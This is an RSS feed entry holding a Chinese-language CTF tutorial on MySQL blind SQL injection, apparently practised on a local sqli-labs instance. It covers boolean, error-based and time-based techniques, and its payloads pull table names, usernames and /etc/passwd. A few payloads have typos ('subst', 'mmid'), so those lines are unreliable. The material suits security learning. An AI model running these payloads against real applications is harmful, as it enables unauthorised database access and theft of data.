<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>CTF on Under The Ginkgo</title>
        <link>https://example.com/categories/ctf/</link>
        <description>Recent content in CTF on Under The Ginkgo</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-uk</language>
        <lastBuildDate>Sun, 27 Mar 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://example.com/categories/ctf/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>SQL注入：盲注</title>
        <link>https://example.com/posts/sqli_blind_injection/</link>
        <pubDate>Sun, 27 Mar 2022 00:00:00 +0000</pubDate>
        
        <guid>https://example.com/posts/sqli_blind_injection/</guid>
        <description>&lt;h2 id=&#34;blind-injection&#34;&gt;Blind injection&lt;/h2&gt;
&lt;p&gt;盲注的特点就在于页面不会显示返回任何有意义的信息，但是我们通过一些标识来得知注入语句是否被执行&lt;/p&gt;
&lt;h3 id=&#34;布尔盲注&#34;&gt;布尔盲注&lt;/h3&gt;
&lt;p&gt;通过构造一些布尔逻辑判断，查看页面是否发生变化来判断语句是否成功执行&lt;/p&gt;
&lt;h4 id=&#34;left&#34;&gt;&lt;code&gt;left()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;left(database(),1)&lt;/p&gt;
&lt;p&gt;?id=1&amp;rsquo;and left(version(),1)=5%23 #version 1st char&lt;/p&gt;
&lt;p&gt;?id=1&amp;rsquo;and length(database())=8%23 # length match&lt;/p&gt;
&lt;p&gt;?id=1&amp;rsquo; and left(database(), 1)&amp;gt;&amp;lsquo;a&amp;rsquo; # database first char match&lt;/p&gt;
&lt;p&gt;?id=1&amp;rsquo; and left(database(), 2)&amp;gt;&amp;lsquo;se&amp;rsquo; # database first two chars match&lt;/p&gt;
&lt;h4 id=&#34;substr-ascii&#34;&gt;&lt;code&gt;substr()&lt;/code&gt; &lt;code&gt;ascii()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;ascii(subst((select table_name from information_schema.tables where tables_schema=database() limit 0,1),1,1)) = 101&lt;/p&gt;
&lt;p&gt;#table_name 1st char match&lt;/p&gt;
&lt;p&gt;Get database() = &amp;ldquo;security&amp;rdquo;&lt;/p&gt;
&lt;p&gt;?id=1&amp;rsquo;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1),1,1)) &amp;gt; 80&lt;/p&gt;
&lt;p&gt;?id=1&amp;rsquo;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1),2,1)) &amp;gt; 80&lt;/p&gt;
&lt;p&gt;?id=1&amp;rsquo;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1, 1),1,1)) &amp;gt; 80&lt;/p&gt;
&lt;h4 id=&#34;regexp&#34;&gt;&lt;code&gt;regexp&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;?id=1&amp;rsquo; and 1=(select 1 from information_schema.columns where table_name=&amp;lsquo;users&amp;rsquo; and table_name regexp &amp;lsquo;^[a-z]&amp;rsquo; limit 0,1)&amp;ndash; -&lt;/p&gt;
&lt;p&gt;?id=1&amp;rsquo; and 1=(select 1 from information_schema.columns where table_name=&amp;lsquo;users&amp;rsquo; and column_name regexp &amp;lsquo;^username&amp;rsquo; limit 0,1)&amp;ndash; -&lt;/p&gt;
&lt;h4 id=&#34;like-匹配注入&#34;&gt;&lt;code&gt;like&lt;/code&gt; 匹配注入&lt;/h4&gt;
&lt;p&gt;select user() like &amp;lsquo;ro%&amp;rsquo;
The percent sign (%) represents zero, one, or multiple characters
The underscore sign (_) represents one, single character&lt;/p&gt;
&lt;h4 id=&#34;ord-and-mid&#34;&gt;&lt;code&gt;ORD()&lt;/code&gt; and &lt;code&gt;MID()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;?id=1&amp;rsquo;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))=68&lt;/p&gt;
&lt;h3 id=&#34;报错盲注&#34;&gt;报错盲注&lt;/h3&gt;
&lt;p&gt;将有价值的信息通过报错的方式显示输出
前提：页面有错误信息显示出来
&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/articles/web/274019.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/articles/web/274019.html&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;bigint数据类型溢出报错注入&#34;&gt;BigInt数据类型溢出报错注入&lt;/h4&gt;
&lt;p&gt;exp(int)函数， &lt;code&gt;mysql版本(5.5.5 - 5.5.49)&lt;/code&gt;  = e^[int]
目的是要造成&amp;quot;DOUBLE value is out of range&amp;quot;的错误&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and exp(~(select * from (select user())a))-- -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;1.先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a
2.然后在查询select * from a 查询a，将结果集a全部查询出来
3.查询完成，语句成功执行，返回值为0，将0按位取反（&amp;rsquo;~&amp;rsquo;）获取，使exp调用的时候报错&lt;/p&gt;
&lt;p&gt;获取表名信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取列名信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;and exp(~(select * from (select column_name from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 0,1)a))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取列名对应的信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;and exp(~(select * from(select username from &amp;#39;usres&amp;#39; limit 0,1)))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;读取文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;and exp(~(select * from (select load_file(&amp;#39;/etc/passwd&amp;#39;))a))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意：对于所有的insert、update和delete语句DIOS查询也同样可以使用 除了exp()函数之外，pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入&lt;/p&gt;
&lt;h4 id=&#34;参数格式错误&#34;&gt;参数格式错误&lt;/h4&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;updatexml()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;updatexml()&lt;/code&gt; 函数利用的就是mysql函数参数格式错误进行报错注入&lt;/p&gt;
&lt;p&gt;&lt;code&gt;updatexml()&lt;/code&gt; 函数语法：updatexml(XML_document,Xpath_string,new_value);&lt;/p&gt;
&lt;p&gt;函数语法解析：&lt;/p&gt;
&lt;p&gt;XML_document:是字符串String格式，为XML文档对象名称&lt;/p&gt;
&lt;p&gt;Xpath_string:Xpath格式的字符串，例如：boostore, bookstore/book, &lt;em&gt;/book, bookstore//book, //@lang, /[/@\d]&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;new_value:string格式，替换查找到的符合条件的数据&lt;/p&gt;
&lt;p&gt;适用版本是： &lt;code&gt;Mysql 5.1.5+&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;利用方式：在执行两个函数时，如果出现xml文件路径错误，就会产生报错 那么我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错&lt;/p&gt;
&lt;p&gt;查询当前数据库的用户信息以及数据库版本信息&lt;/p&gt;
&lt;p&gt;?id=1&amp;rsquo; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)&amp;ndash; -
根据上面对于Xpath_string的定义我们可以得知，当使用类似0x7e=&amp;rsquo;~&amp;lsquo;之类的额外字符的时候，会被认定为非Xpath，就会产生报错&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;https://example.com/ox-hugo/2022-03-23_20-38-37_screenshot.png&#34; width=&#34;400px&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;查询当前数据库名称及操作系统版本信息：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and updatexml(1,concat(0x7e,database(),0x7e,@@version_compile_os,0x7e),3)-- -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取当前数据库下数据表信息：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3)-- -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;为啥不可以？&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),3)-- -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意
: updatexml最多只能显示32位，需要配合SUBSTR使用&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;extractvalue()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;函数语法:extractvalue(XML_document,XPath_string)&lt;/p&gt;
&lt;p&gt;适用的版本：5.1.5+&lt;/p&gt;
&lt;p&gt;利用的原理也是xpath格式不符报错注入&lt;/p&gt;
&lt;p&gt;获取当前是数据库名称及使用mysql数据库的版本信息：&lt;/p&gt;
&lt;p&gt;and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e))&lt;/p&gt;
&lt;p&gt;获取当前注入点的用户权限信息及操作系统版本信息：&lt;/p&gt;
&lt;p&gt;and extractvalue(1,concat(0x7e,@@version_compile_os,0x7e,user(),0x7e))&lt;/p&gt;
&lt;p&gt;获取当前位置所用数据库的位置：&lt;/p&gt;
&lt;p&gt;and extractvalue(1,concat(0x7e,@@datadir,0x7e))&lt;/p&gt;
&lt;p&gt;获取数据表信息:&lt;/p&gt;
&lt;p&gt;and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))&lt;/p&gt;
&lt;p&gt;获取users数据表的列名信息:&lt;/p&gt;
&lt;p&gt;and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&amp;lsquo;users&amp;rsquo; limit 0,1),0x7e))&lt;/p&gt;
&lt;p&gt;获取对应的列名的信息(username\password):&lt;/p&gt;
&lt;p&gt;and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e))&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;主键重复&#34;&gt;主键重复&lt;/h4&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/m0%5F53065491/article/details/121893986&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/m0%5F53065491/article/details/121893986&lt;/a&gt;
这种方式可以实现报错的原因是：虚拟表的主键重复。&lt;/p&gt;
&lt;p&gt;首先，主键重复方式的报错注入利用的函数有： &lt;code&gt;floor()&lt;/code&gt; +  &lt;code&gt;rand()&lt;/code&gt;  + &lt;code&gt;group()&lt;/code&gt; + &lt;code&gt;count()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中， &lt;code&gt;floor()&lt;/code&gt; 函数的作用就是返回小于等于该值的最大整数，即向下取整，只保留整数部分
因此 &lt;code&gt;floor(rand(0)*2))就表示包含0，1的数组&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;count(*)&lt;/code&gt; 函数是一个聚合函数 group by 语句与 &lt;code&gt;count()&lt;/code&gt; 函数结合，根据一个或多个列对结果集进行分组&lt;/p&gt;
&lt;p&gt;主键重复报错注入原理：
使用group by 会首先生成一个虚拟表，虚拟表有两个字短，key, count(*),key表示主键，这里就是 &lt;code&gt;concat(database(),floor(rand(0)*2)&lt;/code&gt; 的值，首先查看 &lt;code&gt;concat(database(),floor(rand(0)*2)&lt;/code&gt; 的值是否存在，这里将会进行第一次计算&lt;/p&gt;
&lt;p&gt;我们当然知道数据库中没有 &lt;code&gt;[security0, security2]&lt;/code&gt; 这样的字段，这种情况下，会直接将 &lt;code&gt;concat(database(),floor(rand(0)*2)&lt;/code&gt; 的值直接当作主键插入临时表中，同时count(*) + 1,这里就进行了第二次计算。&lt;/p&gt;
&lt;p&gt;那么继续第二条记录，如果第一次 &lt;code&gt;concat(database(),floor(rand(0)*2)&lt;/code&gt; 的计算发现没有主键（比如已经插入了security1,但这次计算出来发现security0不存在），那么要进行插入，第二次计算 &lt;code&gt;concat(database(),floor(rand(0)*2)&lt;/code&gt; ，但是计算的结果又变回了 security1，插入失败，主键重复，导致报错
payload：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;时间盲注&#34;&gt;时间盲注&lt;/h3&gt;
&lt;h4 id=&#34;sleep&#34;&gt;&lt;code&gt;sleep()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;利用一些延时函数来造成响应时间的变化来，判断语句是否成功执行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;If&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ascii&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;判断语句，条件为假，&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;执行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;find_in_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mmid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0,1,2,3,4,5,6,7,8,9,.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可 取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。&lt;/p&gt;
&lt;h4 id=&#34;benchmark&#34;&gt;benchmark()&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过时间长短的变化，判断语句是否执行成功，这是一种边信道攻击，在运行过程中占用大量的CPU资源，推荐使用sleep()&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Databse&lt;/th&gt;
&lt;th&gt;Expression&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Mysql&lt;/td&gt;
&lt;td&gt;BENCHMARK(100000,MD5(1)) or sleep(5)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Postgresql&lt;/td&gt;
&lt;td&gt;PG_SLEEP(5) OR GENERATE_SERIES(1,10000)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ms sql server&lt;/td&gt;
&lt;td&gt;WAITFOR DELAY ‘0:0:5’&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;笛卡尔积-heavy-query&#34;&gt;笛卡尔积（heavy query）&lt;/h4&gt;
&lt;p&gt;通过查询多个表合集来造成大量的查询，导致查询时间变长造成延迟&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/sqli/Less-5/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39;and ascii(substr((select username from users limit 0, 1),1,1)) &amp;lt; 50 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;https://example.com/ox-hugo/2022-03-24_19-54-12_screenshot.png&#34; width=&#34;400px&#34;/&gt;
&lt;/figure&gt;

&lt;h4 id=&#34;get-lock&#34;&gt;GET_LOCK&lt;/h4&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin%5F40006763/article/details/111687849&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/weixin%5F40006763/article/details/111687849&lt;/a&gt;
mysql_pconnect(server,user,pwd,clientflag)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysqlp_connect() 函数 打开一个到 MySQL 服务器的持久连接 mysqlpconnect() 和 mysqlconnect() 非常相似，但有两个主要区别： 1、当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的(持久)连接， 如果找到，则返回此连接标识而不打开新连接。 2、当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用 (mysqlclose() 不会关闭由 mysql_pconnect() 建立的连接).
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;get_lock(str,timeout)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。 在一个session中锁定变量，同时通过另外一个session执行，将会产生延时
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也就是说此方法只有在数据库的连接是持久连接的时候才能生效 举个栗子： 打开两个mysql的shell 现在一个shell中执行命令 select getlock(&amp;lsquo;sdpc&amp;rsquo;,5) 先上锁 然后另外一个shell中执行重复的命令 第二个shell中便出现延迟 延迟的时间由第二个shell的getlock中的参数决定.So，在我们写脚本的时候，先加锁，再进行盲注即可(使用requests库时注意加锁和盲注不要在同一个session下)&lt;/p&gt;
&lt;h4 id=&#34;正则bug&#34;&gt;正则bug&lt;/h4&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/2288&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/2288&lt;/a&gt;
这是一个老生常谈的问题了，但之前可能很少会把它放到注入里讨论。&lt;/p&gt;
&lt;p&gt;正则匹配在匹配较长字符串但自由度比较高的字符串时，会造成比较大的计算量，我们通过rpad或repeat构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql&amp;gt; select rpad(&amp;#39;a&amp;#39;,4999999,&amp;#39;a&amp;#39;) RLIKE concat(repeat(&amp;#39;(a.*)+&amp;#39;,30),&amp;#39;b&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------------------------------------------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| rpad(&amp;#39;a&amp;#39;,4999999,&amp;#39;a&amp;#39;) RLIKE concat(repeat(&amp;#39;(a.*)+&amp;#39;,30),&amp;#39;b&amp;#39;) |
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------------------------------------------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|                                                           0 |
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------------------------------------------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1 row in set (5.22 sec)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        
    </channel>
</rss>
